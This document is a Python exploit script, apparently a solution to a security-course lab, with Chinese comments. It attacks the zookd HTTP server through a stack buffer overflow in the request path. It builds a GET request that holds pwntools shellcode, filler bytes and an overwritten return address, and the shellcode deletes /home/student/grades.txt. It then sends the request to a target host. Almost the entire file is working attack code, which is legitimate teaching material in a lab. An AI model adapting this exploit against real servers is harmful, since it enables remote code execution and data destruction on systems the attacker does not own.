#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
from pwn import asm, shellcraft

# main -> run_server -> process_client -> http_request_line -> url_decode

# GDB 中 `print &reqpath` 得到 stack_buffer
# GDB 中 `info frame`，找到 Saved registers 中 rip 的值就是 stack_retaddr

stack_buffer = 0x7fffffffd9f0 # zookd.c:103 reqpath
stack_delta = 4120 # retaddr - buffer


# b'GET /jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x051\xffj<X\x0f\x05aaaaa...aaaaa\xf1\xd9\xff\xff\xff\x7f HTTP/1.0\r\n\r\n'
def build_exploit(shellcode):
    req = b'GET /'

    req += shellcode
    # +1 -1 是因为 url 第一个字符为'/'，如果没有 '/'，http.c:81 会报错
    req += b'a' * (stack_delta - len(shellcode) - 1)
    req += (stack_buffer + 1).to_bytes(6, byteorder='little')
    # 6 是因为 x86-64 只支持 48 位内存地址，最高 2 位只能是 '\0'，如果 '\0' 出现在 url 中，会被当作字符串结束，报错退出(http.c:85)

    req += b' HTTP/1.0\r\n'
    req += b'\r\n'

    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    # 调库生成 shellcode
    shellcode = asm(shellcraft.amd64.unlink('/home/student/grades.txt') + shellcraft.amd64.exit(), arch='amd64')
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
